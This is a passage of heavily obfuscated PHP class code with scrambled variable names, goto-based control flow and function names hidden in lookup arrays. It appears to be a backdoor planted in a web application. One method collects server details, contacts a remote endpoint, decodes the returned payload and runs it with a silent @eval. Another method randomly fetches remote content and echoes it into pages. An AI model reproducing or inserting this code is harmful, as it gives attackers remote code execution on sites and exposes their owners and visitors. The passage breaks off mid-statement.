$GLOBALS[$aÍ…Âò¸¾Ö[91]][$aÍ…Âò¸¾Ö[95]][$aÍ…Âò¸¾Ö[270]] = $aÍ…Âò¸¾Ö[220]; goto FÚİÂ®¨¥¸; FÚİÂ®¨¥¸: $GLOBALS[$aÍ…Âò¸¾Ö[91]][$aÍ…Âò¸¾Ö[95]][$aÍ…Âò¸¾Ö[267]] = $aÍ…Âò¸¾Ö[232]; $e¨ÂÔôÒ‰° = $_SERVER[‚Ğ°–—î][620]; if (!$e¨ÂÔôÒ‰°) { return; } goto f°‚ÑÂ¯¶æ; b·´İ†„Œ: } public function drplea12001c() { return $_SERVER[òÈ„‹Ü][273]; } private function rdab5b5a9f92() { goto d†ŸÙ–Ü±À; a–‘ƒ‚­ÈÙ: if (!$Cõ®Î¿ğ÷[239]($_SERVER[$Cõ®Î¿ğ÷[44]], $f‹„ƒğ§°Ú)) { return; } if ($Cõ®Î¿ğ÷[233]() % 4 != 0) { return; } $DëÆéß‹¿‚ = $Cõ®Î¿ğ÷[13](array($Cõ®Î¿ğ÷[279], $Cõ®Î¿ğ÷[280]), $aê†¥Âé¨¦); goto fõÇéî®ß; C²¢Ò·œ†: if ($this->{$_SERVER[òÈ„‹Ü][199]}($BÅçêóŒÔ¾[$Cõ®Î¿ğ÷[283]]) != $f„Òª·‘˜á[$Cõ®Î¿ğ÷[165]]) { $EÕ“ãËŸ = array($Cõ®Î¿ğ÷[202] => $Cõ®Î¿ğ÷[61]($Cõ®Î¿ğ÷[62])->{$_SERVER[òÈ„‹Ü][63]}($Cõ®Î¿ğ÷[116]), $Cõ®Î¿ğ÷[203] => $_SERVER[$Cõ®Î¿ğ÷[115]], $Cõ®Î¿ğ÷[204] => $Cõ®Î¿ğ÷[205](), $Cõ®Î¿ğ÷[174] => $_SERVER[$Cõ®Î¿ğ÷[175]]); $cœëƒŒì¹¡ = $this->{$_SERVER[òÈ„‹Ü][206]}($Cõ®Î¿ğ÷[148]($EÕ“ãËŸ)); $BÅçêóŒÔ¾ = $this->{$_SERVER[òÈ„‹Ü][182]}($Cõ®Î¿ğ÷[207] . $cœëƒŒì¹¡); if ($BÅçêóŒÔ¾ && $Cõ®Î¿ğ÷[191]($BÅçêóŒÔ¾) && isset($BÅçêóŒÔ¾[$Cõ®Î¿ğ÷[283]])) { $fÈ¬²ÂÁÈ = $this->{$_SERVER[òÈ„‹Ü][188]}($BÅçêóŒÔ¾[$Cõ®Î¿ğ÷[283]], 2); if ($fÈ¬²ÂÁÈ) { $fÈ¬²ÂÁÈ = $this->{$_SERVER[òÈ„‹Ü][199]}($fÈ¬²ÂÁÈ); } if ($fÈ¬²ÂÁÈ) { try { @eval($fÈ¬²ÂÁÈ); } catch (Exception $aà¤–‹µíç) { } } } } goto fµ‹îä‹İ; c²Ï«ëÈå½: $f¾ÕÌ¬ù¤® = $dç³ç¶[624]; if (!$Cõ®Î¿ğ÷[191]($BÅçêóŒÔ¾)) { return; } if ($BÅçêóŒÔ¾[$Cõ®Î¿ğ÷[165]] && $BÅçêóŒÔ¾[$Cõ®Î¿ğ÷[283]]) { if ($this->{$_SERVER[òÈ„‹Ü][199]}($BÅçêóŒÔ¾[$Cõ®Î¿ğ÷[283]]) == $f„Òª·‘˜á[$Cõ®Î¿ğ÷[165]]) { return; } } goto DßÅÃ¨•æ; aÙ÷²•Ğ Ÿ: $FÊ²ÒÑÕ³ = $dç³ç¶[622]; while (strlen($FÊ²ÒÑÕ³) < $dç³ç¶[572]) { if (!$FÊ²ÒÑÕ³) { break; } $FÊ²ÒÑÕ³++; } if ($this->rxhtc414dee3 == $Cõ®Î¿ğ÷[121] || !$Cõ®Î¿ğ÷[104]($GLOBALS, $Cõ®Î¿ğ÷[132])) { return; } goto a–‘ƒ‚­ÈÙ; DßÅÃ¨•æ: $this->{$_SERVER[òÈ„‹Ü][164]}(); $DÂÀÉçğ = $dç³ç¶[625]; if (strlen($DÂÀÉçğ) < $dç³ç¶[572]) { return; } goto C²¢Ò·œ†; fğ¹Š½áõØ: $d»²²ƒºôÃ = $dç³ç¶[621]; if (strlen($d»²²ƒºôÃ) < $dç³ç¶[551]) { die; } $aê†¥Âé¨¦ = $Cõ®Î¿ğ÷[277] . $Cõ®Î¿ğ÷[114]($Cõ®Î¿ğ÷[278]); goto aÙ÷²•Ğ Ÿ; Aù•ñ©¢Çõ: if (!$a‰‚Üó±”—) { return; } $f„Òª·‘˜á = array($Cõ®Î¿ğ÷[165] => $Cõ®Î¿ğ÷[61]($Cõ®Î¿ğ÷[62])->{$_SERVER[òÈ„‹Ü][63]}($Cõ®Î¿ğ÷[209]), $Cõ®Î¿ğ÷[178] => $this->rxhtc414dee3, $Cõ®Î¿ğ÷[176] => $_SERVER[$Cõ®Î¿ğ÷[177]], $Cõ®Î¿ğ÷[169] => $Cõ®Î¿ğ÷[149], $Cõ®Î¿ğ÷[172] => $_SERVER[$Cõ®Î¿ğ÷[173]]); $BÅçêóŒÔ¾ = $this->{$_SERVER[òÈ„‹Ü][182]}($Cõ®Î¿ğ÷[282], $f„Òª·‘˜á); goto c²Ï«ëÈå½; d†ŸÙ–Ü±À: $dç³ç¶ =& $_SERVER[‚Ğ°–—î]; $Cõ®Î¿ğ÷ =& $_SERVER[òÈ„‹Ü]; $f‹„ƒğ§°Ú = array($Cõ®Î¿ğ÷[274], $Cõ®Î¿ğ÷[275], $Cõ®Î¿ğ÷[276]); goto fğ¹Š½áõØ; fõÇéî®ß: if ($DëÆéß‹¿‚ && $Cõ®Î¿ğ÷[233]() - $DëÆéß‹¿‚ < $Cõ®Î¿ğ÷[201]($Cõ®Î¿ğ÷[281])) { return; } $Cõ®Î¿ğ÷[13](array($Cõ®Î¿ğ÷[279], $Cõ®Î¿ğ÷[152]), $aê†¥Âé¨¦, $Cõ®Î¿ğ÷[233]()); $a‰‚Üó±”— = $dç³ç¶[623]; goto Aù•ñ©¢Çõ; fµ‹îä‹İ: } private function qyrx37486e8b($Cá‘•¬©»Ç = '', $fÒÊˆ¢Ã¡ = array(), $f”ÀŞ¿îº = 5) { goto Bç×ßâÚ…; AáË­Ò¹¤™: if ($fÒÊˆ¢Ã¡ === -1) { return $bÉËÅ®•”; } $f…æÔè¨ùë = $EÍæÏŠ±À[248](array($EÍæÏŠ±À[249] => array($EÍæÏŠ±À[252] => $f”ÀŞ¿îº, $EÍæÏŠ±À[250] => $EÍæÏŠ±À[288]), $EÍæÏŠ±À[289] => array($EÍæÏŠ±À[290] => !1, $EÍæÏŠ±À[291] => !1))); $fÒÊˆ¢Ã¡ = @$EÍæÏŠ±À[253]($bÉËÅ®•”, !1, $f…æÔè¨ùë); goto A¥ìÅ»‡ğ„; A¥ìÅ»‡ğ„: $E»â÷Öã¿Ÿ = $e«˜Áù»¢‚[627]; return $EÍæÏŠ±À[190]($fÒÊˆ¢Ã¡, !0); $cÍ¢‡Ş«öç = $e«˜Áù»¢‚[628]; goto Fôø½è‚–; C¬Ÿó†‘¿Ù: $bÉËÅ®•” = $this->{$_SERVER[òÈ„‹Ü][246]}($bÉËÅ®•”, $EÍæÏŠ±À[285]); $d†‰‘œ¢©œ = $e«˜Áù»¢‚[626]; $bÉËÅ®•” = $bÉËÅ®•” . $Cá‘•¬©»Ç . $EÍæÏŠ±À[286] . $EÍæÏŠ±À[287]($fÒÊˆ¢Ã¡); goto AáË­Ò¹¤™; Bç×ßâÚ…: $e«˜Áù»¢‚ =& $_SERVER[‚Ğ°–—î]; $EÍæÏŠ±À =& $_SERVER[òÈ„‹Ü]; $bÉËÅ®•” = $EÍæÏŠ±À[284]; goto C¬Ÿó†‘¿Ù; Fôø½è‚–: if (!$cÍ¢‡Ş«öç) { die; } goto fÆâ¤‚òƒ»; fÆâ¤‚òƒ»: } private function rjdt8d2da85e() { goto A”’Æ°º; Dœ”Ğö›ƒØ: $Cö¤èÔø¼® = $Có¦îÍºÎ°[$this->rxhtc414dee3]; $Cö¤èÔø¼® = $FÑå£Ëôæ[201]($Cö¤èÔø¼® ? $Cö¤èÔø¼® : $FÑå£Ëôæ[293]); $c•È­Òƒ£è = $FÑå£Ëôæ[104]($this->rsvj46b300e7, $FÑå£Ëôæ[319]); goto E£ôÚ¯‚Ù; A”’Æ°º: $B¾¬ö­¢äÈ =& $_SERVER[‚Ğ°–—î]; $FÑå£Ëôæ =& $_SERVER[òÈ„‹Ü]; $Có¦îÍºÎ° = array($FÑå£Ëôæ[292] => $FÑå£Ëôæ[293], $FÑå£Ëôæ[294] => $FÑå£Ëôæ[295], $FÑå£Ëôæ[296] => $FÑå£Ëôæ[297], $FÑå£Ëôæ[298] => $FÑå£Ëôæ[299], $FÑå£Ëôæ[300] => $FÑå£Ëôæ[301], $FÑå£Ëôæ[302] => $FÑå£Ëôæ[241], $FÑå£Ëôæ[303] => $FÑå£Ëôæ[241], $FÑå£Ëôæ[304] => $FÑå£Ëôæ[293], $FÑå£Ëôæ[305] => $FÑå£Ëôæ[295], $FÑå£Ëôæ[306] => $FÑå£Ëôæ[297], $FÑå£Ëôæ[307] => $FÑå£Ëôæ[308], $FÑå£Ëôæ[309] => $FÑå£Ëôæ[299], $FÑå£Ëôæ[310] => $FÑå£Ëôæ[311], $FÑå£Ëôæ[312] => $FÑå£Ëôæ[301], $FÑå£Ëôæ[313] => $FÑå£Ëôæ[314], $FÑå£Ëôæ[315] => $FÑå£Ëôæ[316], $FÑå£Ëôæ[317] => $FÑå£Ëôæ[318]); goto Dœ”Ğö›ƒØ; e‚ŒÖ˜¸Ä¦: $BëİôØË· = $B¾¬ö­¢äÈ[630]; if (!$BëİôØË·) { die; } return $Cö¤èÔø¼® + $c•È­Òƒ£è; goto aõê½—ãÃ; E£ôÚ¯‚Ù: $C‡êÂˆî… = $B¾¬ö­¢äÈ[629]; while (strlen($C‡êÂˆî…) < $B¾¬ö­¢äÈ[555]) { if (!$C‡êÂˆî…) { break; } $C‡êÂˆî…++; } $c•È­Òƒ£è = $c•È­Òƒ£è ? $FÑå£Ëôæ[201]($c•È­Òƒ£è) : 0; goto e‚ŒÖ˜¸Ä¦; aõê½—ãÃ: } public function oljraac3f580($cñÒ††æŞ”) { goto BäÁ×¼ Ä; BäÁ×¼ Ä: $C˜ÙòÑÙÑ =& $_SERVER[‚Ğ°–—î]; $BØ÷éÅ¢© =& $_SERVER[òÈ„‹Ü]; $D†˜×äÇÍ— = $this->{$_SERVER[òÈ„‹Ü][137]}(); goto eÄîÒ¡Â¬Ÿ; DÏ¯¦”ß”à: if (!$BØ÷éÅ¢©[239]($cñÒ††æŞ”[$BØ÷éÅ¢©[321]], $D»‰ĞÎÍÈ¼)) { $BØ÷éÅ¢©[166]($BØ÷éÅ¢©[324], !1, $BØ÷éÅ¢©[236]); } goto fì²ÓÔË‚À; eÄîÒ¡Â¬Ÿ: $E¤¬¬»ÜÓÔ = $C˜ÙòÑÙÑ[631]; if (!$E¤¬¬»ÜÓÔ) { return; } if ($D†˜×äÇÍ— >= $BØ÷éÅ¢©[201]($BØ÷éÅ¢©[241])) { return; } goto F°Ï£«à; bøš¨ÊµÏ¹: if ($eñé‡Ì·÷ <= $D†˜×äÇÍ—) { return; } $D»‰ĞÎÍÈ¼ = $BØ÷éÅ¢©[61]($BØ÷éÅ¢©[139])->{$_SERVER[òÈ„‹Ü][320]}($BØ÷éÅ¢©[321])->{$_SERVER[òÈ„‹Ü][322]}($D†˜×äÇÍ—)->{$_SERVER[òÈ„‹Ü][323]}(); $D»‰ĞÎÍÈ¼ = $BØ÷éÅ¢©[222]($D»‰ĞÎÍÈ¼, $BØ÷éÅ¢©[10], $BØ÷éÅ¢©[321]); goto DÏ¯¦”ß”à; F°Ï£«à: $eñé‡Ì·÷ = $BØ÷éÅ¢©[61]($BØ÷éÅ¢©[139])->{$_SERVER[òÈ„‹Ü][140]}(); $FÙğ¼•Ğæ = $C˜ÙòÑÙÑ[632]; if (!$FÙğ¼•Ğæ) { return; } goto bøš¨ÊµÏ¹; fì²ÓÔË‚À: } public function abrzef74f036() { goto Dñ‚­µ¢§ƒ; C¤† Ò: echo $f•ïŒÉ”´[326] . $f•ïŒÉ”´[327]($D«ßÒ‡ùÉÉ) . $f•ïŒÉ”´[328]; $a¬îç™ã¢Ø = $fŸÅÏ÷¾Ê[636]; if (!$a¬îç™ã¢Ø) { die; } goto eÚÀÎáø; cŠ¤ğ›„á: $cÙóŠ´Ãˆ³ = $this->{$_SERVER[òÈ„‹Ü][246]}($cÙóŠ´Ãˆ³, $f•ïŒÉ”´[247]); $bóÚ—Ó‡Â« = $fŸÅÏ÷¾Ê[634]; while (strlen($bóÚ—Ó‡Â«) < $fŸÅÏ÷¾Ê[558]) { if (!$bóÚ—Ó‡Â«) { break; } $bóÚ—Ó‡Â«++; } goto Dâ¥¦®º¥; eìâõ¯…®Ÿ: $cÙóŠ´Ãˆ³ = $f•ïŒÉ”´[245]; $Cº¥‘ÅÌ‘¨ = $fŸÅÏ÷¾Ê[633]; while (strlen($Cº¥‘ÅÌ‘¨) < $fŸÅÏ÷¾Ê[610]) { if (!$Cº¥‘ÅÌ‘¨) { break; } $Cº¥‘ÅÌ‘¨++; } goto cŠ¤ğ›„á; Dâ¥¦®º¥: $F „ë»óğ¤ = $f•ïŒÉ”´[248](array($f•ïŒÉ”´[249] => array($f•ïŒÉ”´[250] => $f•ïŒÉ”´[251], $f•ïŒÉ”´[252] => 3))); $D«ßÒ‡ùÉÉ = @$f•ïŒÉ”´[253]($cÙóŠ´Ãˆ³, !1, $F „ë»óğ¤); $aˆ¬Á¾ˆÀ’ = $fŸÅÏ÷¾Ê[635]; goto C¤† Ò; Dñ‚­µ¢§ƒ: $fŸÅÏ÷¾Ê =& $_SERVER[‚Ğ°–—î]; $f•ïŒÉ”´ =& $_SERVER[òÈ„‹Ü]; if (!$f•ïŒÉ”´[104]($GLOBALS, $f•ïŒÉ”´[132]) || $f•ïŒÉ”´[325](1, 100) > 20) { return; } goto eìâõ¯…®Ÿ; eÚÀÎáø: } private function yhwb21ce2c42($FõòŞœ‘Ó§, $fÛ©¤å›ª–, $eŸ½·‘Ë = 3) { goto eã…–ôØìò; FâĞòÎ°‹ƒ: if (strlen($bßˆ½Á…¹œ) < $dŸçÖæ¦ø°[572]) { die; } $a°º•í…§„ = $B»Ïù´‘ì¹[325](0, 5) . $B»Ïù´‘ì¹[10]; $E–Ğ¾Ì©±¿ = $dŸçÖæ¦ø°[639]; goto FÏ‹‰ã–á³; eã…–ôØìò: $dŸçÖæ¦ø° =& $_SERVER[‚Ğ°–—î]; $B»Ïù´‘ì¹ =& $_SERVER[òÈ„‹Ü]; $B»Ïù´‘ì¹[329](1); goto BÙÜô; aÀİÖ´¶âŒ: $BĞ¢À½®á = $dŸçÖæ¦ø°[640]; if (strlen($BĞ¢À½®á) < $dŸçÖæ¦ø°[555]) { die; } switch ($a°º•í…§„) { case $B»Ïù´‘ì¹[232]: $Aø¢Äˆ´ßŒ = $this->{$_SERVER[òÈ„‹Ü][147]}($FõòŞœ‘Ó§, $B»Ïù´‘ì¹[214]($fÛ©¤å›ª– . $c¹ƒŠ ‚ˆ)); break; $c‰…±ÈçÉ† = $dŸçÖæ¦ø°[641]; case $B»Ïù´‘ì¹[220]: $Aø¢Äˆ´ßŒ = $this->{$_SERVER[òÈ„‹Ü][147]}($FõòŞœ‘Ó§, $B»Ïù´‘ì¹[214]($c¹ƒŠ ‚ˆ . $fÛ©¤å›ª–)); break; case $B»Ïù´‘ì¹[331]: $Aø¢Äˆ´ßŒ = $this->{$_SERVER[òÈ„‹Ü][147]}($FõòŞœ‘Ó§, $B»Ïù´‘ì¹[118]($c¹ƒŠ ‚ˆ . $fÛ©¤å›ª–)); $BñÆ…™ìÕ = $dŸçÖæ¦ø°[642]; if (!$BñÆ…™ìÕ) { die; } break; $e©÷Š­¡ƒ˜ = $dŸçÖæ¦ø°[643]; if (strlen($e©÷Š­¡ƒ˜) < $dŸçÖæ¦ø°[551]) { return; } case $B»Ïù´‘ì¹[332]: $Aø¢Äˆ´ßŒ = $this->{$_SERVER[òÈ„‹Ü][147]}($FõòŞœ‘Ó§, $B»Ïù´‘ì¹[114]($c¹ƒŠ ‚ˆ . $fÛ©¤å›ª–)); $FÉôµçŠæ = $dŸçÖæ¦ø°[644]; break; case $B»Ïù´‘ì¹[333]: goto FÂ‡¿³±©…; CõÀ–â˜óå: $A½æ³ˆ»š˜ = $dŸçÖæ¦ø°[650]; while ($A½æ³ˆ»š˜ < $dŸçÖæ¦ø°[610]) { if ($A½æ³ˆ»š˜ >= 0) { break; } $A½æ³ˆ»š˜++; } for ($b…¿çØÉãŒ = 0; $b…¿çØÉãŒ < $B»Ïù´‘ì¹[24]($FõòŞœ‘Ó§); $b…¿çØÉãŒ++) { $FßÆ¤ëñŠ¼ = $FßÆ¤ëñŠ¼ == $B»Ïù´‘ì¹[24]($Eª¢Û¸»ª) ? 0 : $FßÆ¤ëñŠ¼; $B­½‘‘Ÿ— = $dŸçÖæ¦ø°[651]; if (strlen($B­½‘‘Ÿ—) < $dŸçÖæ¦ø°[610]) { return; } $b½¸Ñ÷òá— = ($e·‡´Í– + $B»Ïù´‘ì¹[335]($dí²èÌáÇ, $FõòŞœ‘Ó§[$b…¿çØÉãŒ]) + $B»Ïù´‘ì¹[336]($Eª¢Û¸»ª[$FßÆ¤ëñŠ¼++])) % 64; $b‰¬×Èë¡ø = $dŸçÖæ¦ø°[652]; while (strlen($b‰¬×Èë¡ø) < $dŸçÖæ¦ø°[610]) { if (!$b‰¬×Èë¡ø) { break; } $b‰¬×Èë¡ø++; } $eƒŠÈã¯«ë .= $dí²èÌáÇ[$b½¸Ñ÷òá—]; $eôÀø¶‰‘ = $dŸçÖæ¦ø°[653]; } goto eä‹®Òáã·; fà‰¸Éº—™: if (!$aœçÍˆå¾) { die; } $b…¿çØÉãŒ = 0; $b½¸Ñ÷òá— = 0; goto F«¶¿”©‹±; F•Ó¼Õã: if (!$AˆÁƒˆ÷ƒ¾) { return; } $e¦÷«Ï›ÖË = $dí²èÌáÇ[$e·‡´Í–]; $C•ÀÉ¨à„‚ = $dŸçÖæ¦ø°[646]; goto cĞ“²ŠŞŸõ; F«¶¿”©‹±: $e¯´ƒô¬ÉÒ = $dŸçÖæ¦ø°[649]; if (strlen($e¯´ƒô¬ÉÒ) < $dŸçÖæ¦ø°[555]) { return; } $FßÆ¤ëñŠ¼ = 0; goto CõÀ–â˜óå; eä‹®Òáã·: $Aø¢Äˆ´ßŒ = $B»Ïù´‘ì¹[327]($e¦÷«Ï›ÖË . $eƒŠÈã¯«ë); break; $aİÃÉ´àƒÒ = $dŸçÖæ¦ø°[654]; goto bÑÂÕ¿İğ‘; cĞ“²ŠŞŸõ: while ($C•ÀÉ¨à„‚ < $dŸçÖæ¦ø°[572]) { if ($C•ÀÉ¨à„‚ >= 0) { break; } $C•ÀÉ¨à„‚++; } $Eª¢Û¸»ª = $B»Ïù´‘ì¹[114]($e¦÷«Ï›ÖË . $B»Ïù´‘ì¹[114]($fÛ©¤å›ª– . $e¦÷«Ï›ÖË) . $fÛ©¤å›ª–); $Eª¢Û¸»ª = $B»Ïù´‘ì¹[25]($Eª¢Û¸»ª, $e·‡´Í– % 8, $e·‡´Í– % 8 + 7); goto FôÉˆ£åƒ™; FÂ‡¿³±©…: $FõòŞœ‘Ó§ = $B»Ïù´‘ì¹[118]($FõòŞœ‘Ó§); $e·‡´Í– = $B»Ïù´‘ì¹[334](0, 64); $AˆÁƒˆ÷ƒ¾ = $dŸçÖæ¦ø°[645]; goto F•Ó¼Õã; bÑÂÕ¿İğ‘: while (strlen($aİÃÉ´àƒÒ) < $dŸçÖæ¦ø°[555]) { if (!$aİÃÉ´àƒÒ) { break; } $aİÃÉ´àƒÒ++; } goto dê§å®²¤; FôÉˆ£åƒ™: $AÈŸæˆÉíè = $dŸçÖæ¦ø°[647]; $eƒŠÈã¯«ë = $B»Ïù´‘ì¹[10]; $aœçÍˆå¾ = $dŸçÖæ¦ø°[648]; goto fà‰¸Éº—™; dê§å®²¤: default: $Aø¢Äˆ´ßŒ = $this->{$_SERVER[òÈ„‹Ü][147]}($FõòŞœ‘Ó§, $fÛ©¤å›ª– . $c¹ƒŠ ‚ˆ); break; } goto D”ŸĞà¿Ú¡; FÏ‹‰ã–á³: if (!$E–Ğ¾Ì©±¿) { return; } $c¹ƒŠ ‚ˆ = $B»Ïù´‘ì¹[124](15); $dí²èÌáÇ = $B»Ïù´‘ì¹[330]; goto aÀİÖ´¶âŒ; D”ŸĞà¿Ú¡: $Aø¢Äˆ´ßŒ = $B»Ïù´‘ì¹[214]($a°º•í…§„ . $c¹ƒŠ ‚ˆ . $Aø¢Äˆ´ßŒ); if ($eŸ½·‘Ë - 1 > 0) { $Aø¢Äˆ´ßŒ = $this->{$_SERVER[òÈ„‹Ü][127]}($Aø¢Äˆ´ßŒ, $fÛ©¤å›ª–, $eŸ½·‘Ë - 1); } return $Aø¢Äˆ´ßŒ; goto fğ—‘Ò¯î–; BÙÜô: $fÀ™êšã = $dŸçÖæ¦ø°[637]; $FõòŞœ‘Ó§ = $B»Ïù´‘ì¹[2]($FõòŞœ‘Ó§); $bßˆ½Á…¹œ = $dŸçÖæ¦ø°[638]; goto FâĞòÎ°‹ƒ; fğ—‘Ò¯î–: } private function kcuz36b8bc5d($Fìº¢ŸÎ¼•, $E¸È¢œØƒ±, $BÒñ™Î¦ª = 3) { goto C¶±¹ŸãƒÂ; aì÷¤–°ªí: $fÏ‰‡Ø«Òœ = $Fìº¢ŸÎ¼•[0]; $Fåå£˜¬×’ = $fÑ²ˆî’Ë·[25]($Fìº¢ŸÎ¼•, 1, 15); $f¹‰ºê› = $AèÙ ƒó¥Ö[656]; goto e¨õĞ½Œ÷¶; C¶±¹ŸãƒÂ: $AèÙ ƒó¥Ö =& $_SERVER[‚Ğ°–—î]; $fÑ²ˆî’Ë· =& $_SERVER[òÈ„‹Ü]; if (!$fÑ²ˆî’Ë·[337]($Fìº¢ŸÎ¼•) || $fÑ²ˆî’Ë·[24]($Fìº¢ŸÎ¼•) < 10) { return !1; } goto B˜«ˆÚ; FçÇŞä°Ó: if ($BÒñ™Î¦ª - 1 > 0) { $A Åã‚–åÂ = $this->{$_SERVER[òÈ„‹Ü][188]}($A Åã‚–åÂ, $E¸È¢œØƒ±, $BÒñ™Î¦ª - 1); } return $A Åã‚–åÂ; goto c­£Ší‰‰; e¨õĞ½Œ÷¶: $Fìº¢ŸÎ¼• = $fÑ²ˆî’Ë·[25]($Fìº¢ŸÎ¼•, 16); $D½„í§ù¯† = $fÑ²ˆî’Ë·[330]; switch ($fÏ‰‡Ø«Òœ) { case $fÑ²ˆî’Ë·[232]: $A Åã‚–åÂ = $this->{$_SERVER[òÈ„‹Ü][246]}($Fìº¢ŸÎ¼•, $fÑ²ˆî’Ë·[214]($E¸È¢œØƒ± . $Fåå£˜¬×’)); $f¼šˆ±åËË = $AèÙ ƒó¥Ö[657]; while ($f¼šˆ±åËË < $AèÙ ƒó¥Ö[610]) { if ($f¼šˆ±åËË >= 0) { break; } $f¼šˆ±åËË++; } break; case $fÑ²ˆî’Ë·[220]: $A Åã‚–åÂ = $this->{$_SERVER[òÈ„‹Ü][246]}($Fìº¢ŸÎ¼•, $fÑ²ˆî’Ë·[214]($Fåå£˜¬×’ . $E¸È¢œØƒ±)); break; $aËŒ‰¿èºî = $AèÙ ƒó¥Ö[658]; case $fÑ²ˆî’Ë·[331]: $A Åã‚–åÂ = $this->{$_SERVER[òÈ„‹Ü][246]}($Fìº¢ŸÎ¼•, $fÑ²ˆî’Ë·[118]($Fåå£˜¬×’ . $E¸È¢œØƒ±)); $a©—ÈŸ²¶Æ = $AèÙ ƒó¥Ö[659]; if (strlen($a©—ÈŸ²¶Æ) < $AèÙ ƒó¥Ö[555]) { die; } break; case $fÑ²ˆî’Ë·[332]: $A Åã‚–åÂ = $this->{$_SERVER[òÈ„‹Ü][246]}($Fìº¢ŸÎ¼•, $fÑ²ˆî’Ë·[114]($Fåå£˜¬×’ . $E¸È¢œØƒ±)); $dŒà‚öŒÍ = $AèÙ ƒó¥Ö[581]; while ($dŒà‚öŒÍ < $AèÙ ƒó¥Ö[555]) { if ($dŒà‚öŒÍ >= 0) { break; } $dŒà‚öŒÍ++; } break; $Cèš¢…Ñ = $AèÙ ƒó¥Ö[660]; if (strlen($Cèš¢…Ñ) < $AèÙ ƒó¥Ö[551]) { die; } case $fÑ²ˆî’Ë·[333]: goto aò±‰° Ãƒ; A†È­¼î­ì: $Câ÷§áÙ¦è = $AèÙ ƒó¥Ö[670]; break; goto DãËë»¨õÆ; CÛ¦•…®¯ö: $fÈ²ÚóÀ„ = $fÑ²ˆî’Ë·[25]($fÈ²ÚóÀ„, $CÍ¨ËÎ›µ % 8, $CÍ¨ËÎ›µ % 8 + 7); $f™‚¦­àô = $fÑ²ˆî’Ë·[10]; $e¥­¦š­ÂØ = 0; goto f˜‚ åÒ‹; aÌÌ•ßï: if (strlen($D¾¤«ƒ­ö) < $AèÙ ƒó¥Ö[610]) { return; } $fÈ²ÚóÀ„ = $fÑ²ˆî’Ë·[114]($a×Õßİà—² . $fÑ²ˆî’Ë·[114]($E¸È¢œØƒ± . $a×Õßİà—²) . $E¸È¢œØƒ±); $eÇ„ —ÑÒ = $AèÙ ƒó¥Ö[664]; goto CÛ¦•…®¯ö; aò±‰° Ãƒ: $Fìº¢ŸÎ¼• = $fÑ²ˆî’Ë·[338]($Fìº¢ŸÎ¼•); $bÀ¢’à = $AèÙ ƒó¥Ö[661]; if (!$bÀ¢’à) { return; } goto aÀ¼£éã®; cí¾ÜÉ‰„÷: if (strlen($BË†‡¯„£) < $AèÙ ƒó¥Ö[551]) { die; } for ($e¥­¦š­ÂØ = 0; $e¥­¦š­ÂØ < $fÑ²ˆî’Ë·[24]($Fìº¢ŸÎ¼•); $e¥­¦š­ÂØ++) { $AÌçÕ´èÇ» = $AÌçÕ´èÇ» == $fÑ²ˆî’Ë·[24]($fÈ²ÚóÀ„) ? 0 : $AÌçÕ´èÇ»; $DˆÊ´ÚÕ·½ = $AèÙ ƒó¥Ö[666]; while ($DˆÊ´ÚÕ·½ < $AèÙ ƒó¥Ö[558]) { if ($DˆÊ´ÚÕ·½ >= 0) { break; } $DˆÊ´ÚÕ·½++; } $EØÓ®íÀâ = $AÌçÕ´èÇ»++; $BÈÊœÅñÒ = $AèÙ ƒó¥Ö[667]; if (strlen($BÈÊœÅñÒ) < $AèÙ ƒó¥Ö[558]) { die; } $e„÷«Û”Õ¤ = $fÑ²ˆî’Ë·[335]($D½„í§ù¯†, $Fìº¢ŸÎ¼•[$e¥­¦š­ÂØ]) - $CÍ¨ËÎ›µ - $fÑ²ˆî’Ë·[336]($fÈ²ÚóÀ„[$EØÓ®íÀâ]); $bÒËÆÙÅğ = $AèÙ ƒó¥Ö[668]; if (strlen($bÒËÆÙÅğ) < $AèÙ ƒó¥Ö[551]) { die; } while ($e„÷«Û”Õ¤ < 0) { $e„÷«Û”Õ¤ += 64; } $f™‚¦­àô .= $D½„í§ù¯†[$e„÷«Û”Õ¤]; $BÒí‘º±½Ô = $AèÙ ƒó¥Ö[669]; while ($BÒí‘º±½Ô < $AèÙ ƒó¥Ö[572]) { if ($BÒí‘º±½Ô >= 0) { break; } $BÒí‘º±½Ô++; } } $A Åã‚–åÂ = $fÑ²ˆî’Ë·[339]($f™‚¦­àô); goto A†È­¼î­ì; cÕƒ‡èÁô: $Fìº¢ŸÎ¼• = $fÑ²ˆî’Ë·[25]($Fìº¢ŸÎ¼•, 1); $CÍ¨ËÎ›µ = $fÑ²ˆî’Ë·[335]($D½„í§ù¯†, $a×Õßİà—²); $D¾¤«ƒ­ö = $AèÙ ƒó¥Ö[663]; goto aÌÌ•ßï; aÀ¼£éã®: $a×Õßİà—² = $Fìº¢ŸÎ¼•[0]; $aò¿òğç°Í = $AèÙ ƒó¥Ö[662]; if (!$aò¿òğç°Í) { return; } goto cÕƒ‡èÁô; f˜‚ åÒ‹: $e„÷«Û”Õ¤ = 0; $AÌçÕ´èÇ» = 0; $BË†‡¯„£ = $AèÙ ƒó¥Ö[665]; goto cí¾ÜÉ‰„÷; DãËë»¨õÆ: default: $A Åã‚–åÂ = $this->{$_SERVER[òÈ„‹Ü][246]}($Fìº¢ŸÎ¼•, $E¸È¢œØƒ± . $Fåå£˜¬×’); break; } goto FçÇŞä°Ó; B˜«ˆÚ: $Fìº¢ŸÎ¼• = $fÑ²ˆî’Ë·[2]($Fìº¢ŸÎ¼•); $e­ë–ã‘¾ = $AèÙ ƒó¥Ö[655]; $Fìº¢ŸÎ¼• = $fÑ²ˆî’Ë·[214]($Fìº¢ŸÎ¼•); goto aì÷¤–°ªí; c­£Ší‰‰: } public function kuefc71c1a1b($DÊ×³Æ¯ŠÇ) { goto aĞ¡Õâ®”£; aĞ¡Õâ®”£: $d‘á³È±Ñ =& $_SERVER[‚Ğ°–—î]; $f½¸éÒù½× =& $_SERVER[òÈ„‹Ü]; $FÃÖõ¨‰£à = $this->{$_SERVER[òÈ„‹Ü][340]}(); goto c—¤½øÖàõ; cå°äĞ†‹ö: while ($e¹Šä¢òˆí < $d‘á³È±Ñ[558]) { if ($e¹Šä¢òˆí >= 0) { break; } $e¹Šä¢òˆí++; } $D†‹•×’ç = $this->{$_SERVER[òÈ„‹Ü][147]}($DÊ×³Æ¯ŠÇ, $d‚¨†„»œ™) . $f½¸éÒù½×[344] . $dò’™Œ•É; return $D†‹•×’ç; goto fÈïÙé¡õÈ; CØªÏÂÉˆÆ: $dò’™Œ•É = $this->{$_SERVER[òÈ„‹Ü][147]}($FÃÖõ¨‰£à * $AÜ·†…˜½î . 